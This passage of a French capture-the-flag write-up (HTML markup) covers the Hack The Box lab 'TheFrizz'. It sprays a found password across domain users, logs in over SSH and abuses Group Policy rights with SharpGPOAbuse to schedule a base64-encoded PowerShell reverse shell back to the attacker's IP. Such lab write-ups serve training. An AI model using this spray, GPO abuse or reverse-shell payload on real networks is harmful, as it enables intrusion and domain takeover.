+</span></span><span class="line"><span class="cl">f.frizzle
+</span></span><span class="line"><span class="cl">w.li
+</span></span><span class="line"><span class="cl">h.arm
+</span></span><span class="line"><span class="cl">M.SchoolBus
+</span></span><span class="line"><span class="cl">d.hudson
+</span></span><span class="line"><span class="cl">k.franklin
+</span></span><span class="line"><span class="cl">l.awesome
+</span></span><span class="line"><span class="cl">t.wright
+</span></span><span class="line"><span class="cl">r.tennelli
+</span></span><span class="line"><span class="cl">J.perlstein
+</span></span><span class="line"><span class="cl">a.perlstein
+</span></span><span class="line"><span class="cl">p.terese
+</span></span><span class="line"><span class="cl">v.frizzle
+</span></span><span class="line"><span class="cl">g.frizzle
+</span></span><span class="line"><span class="cl">c.sandiego
+</span></span><span class="line"><span class="cl">c.ramon
+</span></span><span class="line"><span class="cl">m.ramon
+</span></span><span class="line"><span class="cl">w.Webservice
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span></span></span></code></pre></div></div>
+<p>Je teste alors le mot de passe sur tous ces utilisateurs et je vois que le mot de passe appartient à <code>M.SchoolBus</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">❯ nxc smb frizzdc.frizz.htb -u users.lst -p <span class="s1">&#39;!suBcig@MehTed!R&#39;</span> -k --continue-on-success
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:frizzdc<span class="o">)</span> <span class="o">(</span>domain:frizz.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\A</span>dministrator:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\G</span>uest:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\k</span>rbtgt:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\f</span>.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\w</span>.li:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\h</span>.arm:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>+<span class="o">]</span> frizz.htb<span class="se">\M</span>.SchoolBus:!suBcig@MehTed!R
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\d</span>.hudson:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\k</span>.franklin:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\l</span>.awesome:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\t</span>.wright:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\r</span>.tennelli:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\J</span>.perlstein:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\a</span>.perlstein:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\p</span>.terese:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\v</span>.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\g</span>.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\c</span>.sandiego:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\c</span>.ramon:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\m</span>.ramon:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>-<span class="o">]</span> frizz.htb<span class="se">\w</span>.Webservice:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED</span></span></code></pre></div></div>
+<p><strong><code>M.SchoolBus</code></strong> possède tous les utilisateurs du domaine sauf l&rsquo;administrateur.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-11.png"
+        data-srcset="/images/TheFrizz/TheFrizz-11.png, /images/TheFrizz/TheFrizz-11.png 1.5x, /images/TheFrizz/TheFrizz-11.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-11.png"
+        title="/images/TheFrizz/TheFrizz-11.png" width="687" height="847" /></p>
+<p>Il est aussi membre du groupe <strong><code>REMOTE MANAGEMENT USERS</code></strong> qui lui permet d&rsquo;avoir une shell sur la machine. Je vois aussi qu&rsquo;il est membre du groupe <strong><code>GOUPE POLICY CREATOR OWNERS</code></strong> ce qui suggère qu&rsquo;il est celui qui gère les GPO du domaine. Or le fait qu&rsquo;il soit dans ce groupe peut être abusé pour permettre une élévation de privilèges en créant ou modifiant une GPO
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-12.png"
+        data-srcset="/images/TheFrizz/TheFrizz-12.png, /images/TheFrizz/TheFrizz-12.png 1.5x, /images/TheFrizz/TheFrizz-12.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-12.png"
+        title="/images/TheFrizz/TheFrizz-12.png" width="765" height="858" /></p>
+<h3 id="ssh-1">SSH</h3>
+<p>Je me connecte alors par SSH en tant que <code>M.SchoolBus</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">❯ ssh -K M.SchoolBus@frizzdc.frizz.htb                                                                                              ⏎
+</span></span><span class="line"><span class="cl">PowerShell 7.4.5
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus&gt; whoami
+</span></span><span class="line"><span class="cl">frizz<span class="se">\m</span>.schoolbus
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus&gt; whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name         <span class="nv">SID</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================</span> <span class="o">==============================================</span>
+</span></span><span class="line"><span class="cl">frizz<span class="se">\m</span>.schoolbus S-1-5-21-2386970044-1145388522-2932701813-1106
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                                   Type             SID                                            <span class="nv">Attributes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">============================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\R</span>emote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">frizz<span class="se">\D</span>esktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">frizz<span class="se">\G</span>roup Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">frizz<span class="se">\D</span>enied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
+</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\M</span>edium Mandatory Level       Label            S-1-16-8192
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                    <span class="nv">State</span>
+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span> Enabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER CLAIMS INFORMATION
+</span></span><span class="line"><span class="cl">-----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User claims unknown.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-system">Shell en tant que system</h2>
+<h3 id="sharpgpoabuse">SharpGPOAbuse</h3>
+<p>Il n&rsquo;y a que deux GPO.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">&gt;</span> <span class="nb">Get-GPO</span> <span class="n">-all</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span>      <span class="err">:</span> <span class="k">Default</span> <span class="n">Domain</span> <span class="n">Policy</span>
+</span></span><span class="line"><span class="cl"><span class="n">DomainName</span>       <span class="err">:</span> <span class="n">frizz</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Owner</span>            <span class="err">:</span> <span class="n">frizz</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="n">Id</span>               <span class="err">:</span> <span class="n">31b2f340</span><span class="p">-</span><span class="mf">016d</span><span class="p">-</span><span class="n">11d2</span><span class="p">-</span><span class="mf">945f</span><span class="p">-</span><span class="n">00c04fb984f9</span>
+</span></span><span class="line"><span class="cl"><span class="n">GpoStatus</span>        <span class="err">:</span> <span class="n">AllSettingsEnabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Description</span>      <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">CreationTime</span>     <span class="err">:</span> <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">7</span><span class="err">:</span><span class="mf">19</span><span class="err">:</span><span class="mf">24</span> <span class="n">AM</span>
+</span></span><span class="line"><span class="cl"><span class="n">ModificationTime</span> <span class="err">:</span> <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">7</span><span class="err">:</span><span class="mf">25</span><span class="err">:</span><span class="mf">44</span> <span class="n">AM</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserVersion</span>      <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">ComputerVersion</span>  <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">WmiFilter</span>        <span class="err">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span>      <span class="err">:</span> <span class="k">Default</span> <span class="n">Domain</span> <span class="n">Controllers</span> <span class="n">Policy</span>
+</span></span><span class="line"><span class="cl"><span class="n">DomainName</span>       <span class="err">:</span> <span class="n">frizz</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Owner</span>            <span class="err">:</span> <span class="n">frizz</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="n">Id</span>               <span class="err">:</span> <span class="n">6ac1786c</span><span class="p">-</span><span class="mf">016f</span><span class="p">-</span><span class="n">11d2</span><span class="p">-</span><span class="mf">945f</span><span class="p">-</span><span class="n">00c04fb984f9</span>
+</span></span><span class="line"><span class="cl"><span class="n">GpoStatus</span>        <span class="err">:</span> <span class="n">AllSettingsEnabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Description</span>      <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">CreationTime</span>     <span class="err">:</span> <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">7</span><span class="err">:</span><span class="mf">19</span><span class="err">:</span><span class="mf">24</span> <span class="n">AM</span>
+</span></span><span class="line"><span class="cl"><span class="n">ModificationTime</span> <span class="err">:</span> <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">7</span><span class="err">:</span><span class="mf">19</span><span class="err">:</span><span class="mf">24</span> <span class="n">AM</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserVersion</span>      <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">ComputerVersion</span>  <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">WmiFilter</span>        <span class="err">:</span></span></span></code></pre></div></div>
+<p>Pour abuser de ce droit, je vais utiliser l&rsquo;outils <strong><code>SharpGPOAbuse.exe</code></strong> qui peut être trouvé dans les exécutables de <a href="https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any" target="_blank" rel="noopener noreffer ">SharpCollection</a>. Je l&rsquo;uploade sur la machine cible avec <strong><code>scp</code></strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">scp SharpGPOAbuse.exe <span class="s1">&#39;M.SchoolBus@frizzdc.frizz.htb:C:/programdata/&#39;</span></span></span></code></pre></div></div>
+<p>Plutôt que de modifier une GPO existante (qui est une mauvaise pratique), je préfère en créer une nouvelle pour l&rsquo;exploiter. Cet <a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-sharpgpoabuse" target="_blank" rel="noopener noreffer ">article</a> explique comment s&rsquo;y prendre.</p>
+<ul>
+<li>Premièrement je crée la GPO que je nomme par mon pseudo</li>
+<li>Ensuite je la relie au domaine</li>
+<li>Enfin j&rsquo;utilise <strong><code>SharpGPOAbuse.exe</code></strong> pour exécuter un reverse shell</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">&gt;</span> <span class="nb">New-GPO</span> <span class="n">-Name</span> <span class="s2">&#34;z3rodol&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span>      <span class="err">:</span> <span class="n">z3rodol</span>
+</span></span><span class="line"><span class="cl"><span class="n">DomainName</span>       <span class="err">:</span> <span class="n">frizz</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Owner</span>            <span class="err">:</span> <span class="n">frizz</span><span class="p">\</span><span class="n">M</span><span class="p">.</span><span class="py">SchoolBus</span>
+</span></span><span class="line"><span class="cl"><span class="n">Id</span>               <span class="err">:</span> <span class="nb">ae539f39-d154</span><span class="p">-</span><span class="n">4dfe</span><span class="p">-</span><span class="n">9a27-ec58f470050e</span>
+</span></span><span class="line"><span class="cl"><span class="n">GpoStatus</span>        <span class="err">:</span> <span class="n">AllSettingsEnabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Description</span>      <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">CreationTime</span>     <span class="err">:</span> <span class="mf">8</span><span class="p">/</span><span class="mf">25</span><span class="p">/</span><span class="mf">2025</span> <span class="mf">4</span><span class="err">:</span><span class="mf">25</span><span class="err">:</span><span class="mf">08</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl"><span class="n">ModificationTime</span> <span class="err">:</span> <span class="mf">8</span><span class="p">/</span><span class="mf">25</span><span class="p">/</span><span class="mf">2025</span> <span class="mf">4</span><span class="err">:</span><span class="mf">25</span><span class="err">:</span><span class="mf">08</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserVersion</span>      <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">ComputerVersion</span>  <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">WmiFilter</span>        <span class="err">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">&gt;</span> <span class="nb">New-GPLink</span> <span class="n">-Name</span> <span class="s2">&#34;z3rodol&#34;</span> <span class="n">-Target</span> <span class="s2">&#34;DC=FRIZZ,DC=HTB&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GpoId</span>       <span class="err">:</span> <span class="nb">ae539f39-d154</span><span class="p">-</span><span class="n">4dfe</span><span class="p">-</span><span class="n">9a27-ec58f470050e</span>
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span> <span class="err">:</span> <span class="n">z3rodol</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enabled</span>     <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enforced</span>    <span class="err">:</span> <span class="n">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">Target</span>      <span class="err">:</span> <span class="n">DC</span><span class="p">=</span><span class="n">frizz</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Order</span>       <span class="err">:</span> <span class="mf">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="py">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&#34;z3rodol&#34;</span> <span class="p">-</span><span class="n">-Author</span> <span class="s1">&#39;z3rodol&#39;</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&#34;rvshell&#34;</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&#34;powershell.exe&#34;</span> <span class="p">-</span><span class="n">-Arguments</span>  <span class="s2">&#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Domain</span> <span class="p">=</span> <span class="n">frizz</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Domain</span> <span class="n">Controller</span> <span class="p">=</span> <span class="n">frizzdc</span><span class="p">.</span><span class="py">frizz</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Distinguished</span> <span class="n">Name</span> <span class="p">=</span> <span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">frizz</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">GUID</span> <span class="n">of</span> <span class="s2">&#34;z3rodol&#34;</span> <span class="n">is</span><span class="err">:</span> <span class="p">{</span><span class="nb">AE539F39-D154</span><span class="p">-</span><span class="n">4DFE</span><span class="p">-</span><span class="n">9A27-EC58F470050E</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Creating</span> <span class="n">file</span> <span class="p">\\</span><span class="n">frizz</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">SysVol</span><span class="p">\</span><span class="n">frizz</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">Policies</span><span class="p">\{</span><span class="nb">AE539F39-D154</span><span class="p">-</span><span class="n">4DFE</span><span class="p">-</span><span class="n">9A27-EC58F470050E</span><span class="p">}\</span><span class="n">Machine</span><span class="p">\</span><span class="n">Preferences</span><span class="p">\</span><span class="n">ScheduledTasks</span><span class="p">\</span><span class="n">ScheduledTasks</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">versionNumber</span> <span class="n">attribute</span> <span class="n">changed</span> <span class="n">successfully</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">The</span> <span class="n">version</span> <span class="n">number</span> <span class="k">in</span> <span class="n">GPT</span><span class="p">.</span><span class="py">ini</span> <span class="n">was</span> <span class="n">increased</span> <span class="n">successfully</span><span class="p">.</span>
